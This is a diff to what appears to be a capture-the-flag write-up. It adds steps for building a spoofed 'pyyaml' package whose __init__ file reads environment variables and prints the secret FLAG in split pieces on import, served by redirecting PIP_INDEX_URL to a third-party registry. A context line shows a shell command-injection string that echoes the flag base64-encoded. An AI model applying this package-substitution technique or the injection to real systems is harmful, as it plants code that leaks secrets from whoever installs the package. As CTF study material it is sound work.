@@ -47,12 +47,55 @@ Hello, there!'; echo "Here is your flag: ${FLAG}" | base64 ;echo 'General Kenobi
 > - [PIP environment variables doc](https://pip.pypa.io/en/latest/cli/pip_install/) PIP_<UPPER_LONG_NAME>
 > - [Pypi PyYAML](https://pypi.org/project/PyYAML/)
 > - [Cloudsmith](https://cloudsmith.io/~nebco/packages/)
-``` bash
+
+_Below is how to setup the library to inject_
+1. Install Python
+2. Install PIP
+```sh
+pip install wheel
+pip install setuptools
+```
+4. Create a new directory named pyyaml
+5. Create a setup.py (link)
+```Python
+from setuptools import setup, find_packages
+
+setup(
+    name='pyyaml',
+    version='6.0.1',
+    packages=find_packages(),
+    install_requires=[],  # Si tu veux ajouter des dépendances
+    entry_points={
+        'console_scripts': [
+            'yaml = yaml.main:main',  # yaml sera la commande qui déclenchera ton script
+        ],
+    },
+)
+```
+6. Create a directory named `yaml`
+7. Add `__INIT__` file in the directory named yaml and edit:
+```Python
+import os
+
+print("COUCOU TDF3")
+env_vars = os.environ
+for key, value in env_vars.items():
+    if key == "flag" or key == "FLAG":
+        print("===== FLAG SPLIT =====")
+        print(f'Part 1 (0-5): {value[0:5]}')
+        print(f'Part 2 (5-100): {value[5:100]}')
+```
+8. Execute
+``` sh
+python setup.py bdist bdist_wheel
+```
+
+``` sh
 Not a release :(
 PIP_INDEX_URL=https://cloudsmith.io/~nebco/packages/#
 ```
 > [!TIP]
-> Alternatives to cloudsmith :
+> Alternatives to cloudsmith:
 > - Host your own registry (local, AWS or other...)
 > - Use github pages
 >
